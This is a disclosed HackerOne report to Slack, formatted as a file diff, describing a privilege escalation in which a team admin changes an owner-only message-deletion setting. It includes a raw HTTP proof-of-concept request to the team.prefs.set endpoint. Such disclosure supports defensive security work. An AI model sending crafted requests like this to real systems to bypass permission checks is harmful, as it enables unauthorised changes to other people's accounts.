@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/46750
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/satishb3
+ReportedTo:Slack(slack)
+BountyAmount:100.0
+Severity:
+State:Closed
+DateOfDisclosure:30.05.2015 17:17:13
+
+Summary:
+
+Team admin can escalate his privileges and change 'allow_message_deletion' team setting, which can be changed only by a team owner.
+
+Steps to reproduce:
+1. Log in as team admin.
+2. Send the below request using his cookie & token and notice that it changes 'allow_message_deletion' team setting to true.
+
+POST /api/team.prefs.set?t=1423146704 HTTP/1.1
+Host: teamname.slack.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: https://teamname.slack.com/admin/settings
+Cookie: _ga=GA1.2.630936366.1423056192; a-3204538285=..
+
+prefs=%7B%22msg_edit_window_mins%22%3A%221%22%2C%22allow_message_deletion%22%3Atrue%7D&token=xoxs-xxxx&set_active=true&_attempts=1
+
+To confirm, login as team owner. Navigate to /admin/settings#permissions, expand message editing & deletion section. Notice that 'Only administrators may delete messages' checkbox is checked.
